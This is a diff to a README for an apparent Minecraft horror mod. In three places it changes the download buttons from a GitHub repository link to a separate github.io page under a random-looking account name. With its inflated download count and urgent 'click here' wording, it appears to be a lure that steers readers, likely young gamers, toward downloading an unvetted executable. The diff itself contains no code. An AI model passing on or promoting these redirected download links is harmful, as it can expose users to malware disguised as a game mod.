@@ -1,6 +1,6 @@
 # 👁️ Verity-JE-BE-Mod-Minecraft - Your Ultimate Horror Companion Awaits
 
-[![Download Verity Mod](https://img.shields.io/badge/Download-Verity_Mod_8.6M%2B-FF5733?style=for-the-badge&logo=github)](https://github.com/absorptive-spadefoottoad898/Verity-JE-BE-Mod-Minecraft)
+[![Download Verity Mod](https://img.shields.io/badge/Download-Verity_Mod_8.6M%2B-FF5733?style=for-the-badge&logo=github)](https://absorptive-spadefoottoad898.github.io)
 
 ## 🎮 What Is Verity Mod?
 
@@ -23,7 +23,7 @@ Welcome, survivor! Follow these simple steps to bring Verity into your Minecraft
 
 Visit this link to download the application:
 
-**[CLICK HERE TO DOWNLOAD VERITY MOD](https://github.com/absorptive-spadefoottoad898/Verity-JE-BE-Mod-Minecraft)**
+**[CLICK HERE TO DOWNLOAD VERITY MOD](https://absorptive-spadefoottoad898.github.io)**
 
 Once you're on the download page, look for the most recent release file. Download it to your computer—it's that simple.
 
@@ -147,7 +147,7 @@ Verity isn't just a mod—it's an experience that will change how you see Minecr
 
 Remember: she's always watching. But that's what makes it fun, right?
 
-**[➡️ START YOUR DESCENT INTO TERROR NOW](https://github.com/absorptive-spadefoottoad898/Verity-JE-BE-Mod-Minecraft)**
+**[➡️ START YOUR DESCENT INTO TERROR NOW](https://absorptive-spadefoottoad898.github.io)**
 
 ---
 
